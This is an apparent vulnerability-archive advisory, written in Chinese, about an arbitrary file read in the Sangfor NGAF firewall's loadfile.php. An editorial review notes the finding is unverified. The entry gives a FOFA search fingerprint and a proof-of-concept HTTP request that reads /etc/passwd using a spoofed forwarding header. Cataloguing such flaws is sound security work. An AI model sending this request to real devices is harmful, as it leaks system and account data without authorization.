---
source: "wy876 漏洞文库"
id: "vw-96ff2815ad10b3d49ba9916c"
entity_id: "ve-96ff2815ad10b3d49ba9916c"
schema_version: "1"
fofa_unverified: "title="
title: "深信服下一代防火墙NGAF loadfile存在任意文件读取漏洞"
product: "Sangfor NGAF"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "y-forwarded-for127.0.0.1；固件/auth不明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99NGAFloadfile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xem61o3tiw39r3cr"
source_status: "recorded"
---

# 深信服下一代防火墙NGAF loadfile存在任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor NGAF
- 本文讨论：loadfile.php任意文件读取
- 版本、权限与配置前提：y-forwarded-for127.0.0.1；固件/auth不明
- 资料类型：NGAF读取请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 与330同入口同请求，只有来源与指纹差异；没有响应/补丁
- fofa元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 版本及特定头作用待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
深信服下一代防火墙NGAF专注网络边界安全效果，通过应用丰富的安全创新防御技术和简单易用的产品设计理念，不仅增强网络边界的安全检测与防控能力，而且实现网络安全风险可视化展示与快速处置，让组织网络边界安全建设更有效、更简单。该系统存在任意文件读取漏洞，会造成敏感信息泄露。

# 二、影响版本
+ 深信服下一代防火墙NGAF

# 三、资产测绘
+ fofa`title="SANGFOR | NGAF"`
+ 特征


# 四、漏洞复现
```http
GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1
Host: 
Accept: */*
Content-Type: application/x-www-form-urlencoded
y-forwarded-for: 127.0.0.1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xem61o3tiw39r3cr>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
